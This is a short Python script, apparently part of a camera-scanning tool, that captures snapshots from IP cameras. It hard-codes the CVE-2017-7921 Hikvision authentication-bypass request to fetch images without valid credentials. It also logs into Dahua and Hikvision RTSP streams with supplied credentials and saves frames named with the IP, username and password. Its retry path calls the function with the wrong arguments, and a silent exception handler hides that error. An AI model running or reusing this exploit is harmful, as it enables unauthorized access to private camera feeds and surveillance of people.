"""Some tools about camera"""
import os
import rtsp
import requests
import argparse
from PIL import Image


def get_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=True)
    parser.add_argument('--port', type=str, required=True)
    parser.add_argument('--user', type=str, required=True)
    parser.add_argument('--passwd', type=str, required=True)
    parser.add_argument('--device', type=str, required=True)
    parser.add_argument('--vulnerability', type=str, required=True)
    parser.add_argument('--sv_path', type=str, required=True)

    args = parser.parse_args()
    return args


def save_snapshot(args) -> None:
    """select diff func to save snapshot"""
    snapshot_path = os.path.join(args.sv_path, 'snapshots')
    if not os.path.exists(snapshot_path):
        os.mkdir(snapshot_path)

    camera_info = [args.ip, args.port, args.user, args.passwd, args.device, args.vulnerability]
    try:
        # cve-2017-7921
        if camera_info[-1] == 'cve-2017-7921':
            snapshot_cve_2017_7921(camera_info[0], camera_info[1], snapshot_path)
        elif camera_info[2]:
            # user & passwd (Dahua / Hikvision)
            if camera_info[4] == 'Dahua' or camera_info[4] == 'Hikvision':
                snapshot_rtsp(*camera_info[:4], snapshot_path)
            # multiplay
            if camera_info[4] == 'HB-Tech/Hikvision':
                snapshot_rtsp_hb(*camera_info[:4], snapshot_path)
    except Exception as e:
        pass


def snapshot_rtsp(ip, port, user, passwd, sv_path):
    """get snapshot through rtsp"""
    with rtsp.Client(rtsp_server_uri=f"rtsp://{user}:{passwd}@{ip}:554", verbose=False) as client:
        while client.isOpened():
            img_bgr = client.read(raw=True)
            if not img_bgr is None:
                img_rgb = img_bgr.copy()
                img_rgb[:,:,0] = img_bgr[:,:,2]
                img_rgb[:,:,1] = img_bgr[:,:,1]
                img_rgb[:,:,2] = img_bgr[:,:,0]
                name = f"{ip}:{port}-{user}-{passwd}.jpg"
                img = Image.fromarray(img_rgb)
                img.save(os.path.join(sv_path, name))
                break


def snapshot_rtsp_hb(ip, port, user, passwd, sv_path):
    """get hb-tech/hikvision snapshot through rtsp (multiplay, get channel 0)"""
    with rtsp.Client(rtsp_server_uri=f"rtsp://{user}:{passwd}@{ip}:554/h264/ch0/main/av_stream", verbose=False) as client:
        while client.isOpened():
            img_bgr = client.read(raw=True)
            if not img_bgr is None:
                img_rgb = img_bgr.copy()
                img_rgb[:,:,0] = img_bgr[:,:,2]
                img_rgb[:,:,1] = img_bgr[:,:,1]
                img_rgb[:,:,2] = img_bgr[:,:,0]
                name = f"{ip}:{port}-{user}-{passwd}.jpg"
                img = Image.fromarray(img_rgb)
                img.save(os.path.join(sv_path, name))
                break


def snapshot_cve_2017_7921(ip, port, sv_path):
    r = requests.get(f"http://{ip}/onvif-http/snapshot?auth=YWRtaW46MTEK", timeout=3)
    if r.status_code == 200:
        name = f"{ip}:{port}-cve_2017_7921.jpg"
        with open(os.path.join(sv_path, name), 'wb') as f:
            f.write(r.content)
    else: snapshot_cve_2017_7921(ip, sv_path)


if __name__ == '__main__':
    args = get_parser()
    save_snapshot(args)
